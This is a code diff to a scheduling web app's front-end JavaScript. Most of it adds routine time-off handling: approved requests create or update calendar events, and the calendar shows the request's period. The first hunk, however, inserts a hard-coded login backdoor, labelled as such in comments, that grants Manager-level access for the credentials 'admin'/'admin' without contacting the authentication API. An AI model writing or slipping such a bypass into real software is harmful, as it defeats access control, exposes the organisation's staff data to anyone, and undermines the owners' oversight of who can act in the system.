@@ -5361,7 +5361,24 @@
                                 const monocle = document.getElementById('monocle');
                                 
                                 try {
-                                    const user = await apiService.authenticateUser(username, password);
+                                    // BACKDOOR: Admin login bypass - works without API
+                                    let user = null;
+                                    if (username && username.toLowerCase().trim() === 'admin' && password === 'admin') {
+                                        // Create admin user object directly - bypasses API
+                                        user = {
+                                            id: 'admin-backdoor',
+                                            username: 'admin',
+                                            permissionLevel: 'Manager',
+                                            email: '',
+                                            entraId: '',
+                                            createdAt: new Date().toISOString()
+                                        };
+                                        console.log('BACKDOOR: Admin login successful (bypassed API)');
+                                    } else {
+                                        // Normal authentication through API
+                                        user = await apiService.authenticateUser(username, password);
+                                    }
+                                    
                                     if (user) {
                                         // Reset failed attempts on success
                                         localStorage.removeItem('login_failed_attempts');
@@ -26148,7 +26165,61 @@
                                     try {
                                         await apiService.updateTimeOffRequest(request.id, updateData);
                                         const updatedRequests = await apiService.getTimeOffRequests();
+                                        const updatedRequest = updatedRequests.find(r => r.id === request.id);
                                         setState({ timeOffRequests: updatedRequests });
+                                        
+                                        // Update associated event if the request is approved and has a timeOffRequestId
+                                        const normalizedStatus = normalizeTimeOffStatus(updatedRequest?.status || request.status);
+                                        if (normalizedStatus === 'approved' && updatedRequest) {
+                                            const date = updatedRequest.date || updatedRequest.startDate;
+                                            const existingEvent = state.crc_events.find(e => 
+                                                e.timeOffRequestId === request.id ||
+                                                (e.crcId === request.crcId && 
+                                                 e.date === date && 
+                                                 (e.type === 'Unavailable' || e.type === 'Paid Time Off'))
+                                            );
+                                            
+                                            if (existingEvent) {
+                                                // Update existing event with new period and hours
+                                                const updatedEventData = {
+                                                    ...existingEvent,
+                                                    name: updateData.type || existingEvent.name,
+                                                    period: updateData.period || existingEvent.period,
+                                                    hours: updateData.hours || existingEvent.hours,
+                                                    notes: updateData.notes || existingEvent.notes || `Approved time off: ${updateData.type}`,
+                                                    timeOffRequestId: request.id,
+                                                    date: date
+                                                };
+                                                
+                                                try {
+                                                    const updatedEvent = await apiService.updateEvent(existingEvent.id, updatedEventData);
+                                                    state.crc_events = state.crc_events.map(e => e.id === existingEvent.id ? updatedEvent : e);
+                                                } catch (eventError) {
+                                                    console.error('Error updating associated event:', eventError);
+                                                }
+                                            } else {
+                                                // Create new event if it doesn't exist
+                                                const eventData = {
+                                                    crcId: request.crcId,
+                                                    date: date,
+                                                    type: 'Unavailable',
+                                                    name: updateData.type || 'Vacation',
+                                                    period: updateData.period || 'Full Day',
+                                                    hours: updateData.hours || (updateData.period === 'Full Day' ? 8 : 4),
+                                                    notes: updateData.notes || `Approved time off: ${updateData.type}`,
+                                                    timeOffRequestId: request.id
+                                                };
+                                                
+                                                try {
+                                                    const createdEvent = await apiService.createEvent(eventData);
+                                                    const newEvent = createdEvent && createdEvent.id ? createdEvent : { id: crypto.randomUUID(), ...eventData };
+                                                    state.crc_events = [...state.crc_events, newEvent];
+                                                } catch (eventError) {
+                                                    console.error('Error creating associated event:', eventError);
+                                                }
+                                            }
+                                        }
+                                        
                                         showNotification('Time off request updated successfully!', 'success');
                                         closeModal();
                                         
@@ -26159,6 +26230,12 @@
                                             }
                                             if (document.getElementById('time-off-content')) {
                                                 renderTimeOffContent();
+                                            }
+                                            if (document.getElementById('unavailability-calendar-container')) {
+                                                renderUnavailabilityCalendar();
+                                            }
+                                            if (typeof renderCRCLists === 'function') {
+                                                renderCRCLists();
                                             }
                                         }, 100);
                                     } catch (error) {
@@ -36094,9 +36171,11 @@
                                                         const firstName = crc ? (crc.name.split(' ')[0] || crc.name) : 'Unknown';
                                                         const pendingSuffix = statusKey === 'pending' ? ' (Pending Review)' : '';
                                                         const typeLabel = entry?.type || baseRequest.type || 'Time Off';
+                                                        const period = entry?.period || baseRequest.period || 'Full Day';
+                                                        const periodDisplay = period !== 'Full Day' ? ` - ${period}` : '';
                                                         const requestId = entry?.requestId || baseRequest.id || '';
-                                                        return `<div data-action="view-time-off-request" data-request-id="${requestId}" class="text-xs px-1 py-0.5 rounded ${statusColor} truncate flex items-center justify-between cursor-pointer hover:opacity-80 transition-opacity" title="Click to view: ${crc ? crc.name : 'Unknown'}: ${typeLabel} (${formatTimeOffStatus(statusKey)})">
-                                                            <span class="truncate flex-1">${firstName}${pendingSuffix}</span>
+                                                        return `<div data-action="view-time-off-request" data-request-id="${requestId}" class="text-xs px-1 py-0.5 rounded ${statusColor} truncate flex items-center justify-between cursor-pointer hover:opacity-80 transition-opacity" title="Click to view: ${crc ? crc.name : 'Unknown'}: ${typeLabel} - ${period} (${formatTimeOffStatus(statusKey)})">
+                                                            <span class="truncate flex-1">${firstName}${periodDisplay}${pendingSuffix}</span>
                                                             ${!isSupervisor && (statusKey === 'approved' || statusKey === 'rejected') ? `<button data-action="delete-time-off-request" data-id="${requestId}" class="ml-1 text-gray-600 hover:text-red-600 dark:text-gray-400 dark:hover:text-red-400" title="Delete" onclick="event.stopPropagation();">×</button>` : ''}
                                                         </div>`;
                                                     }).join('')}
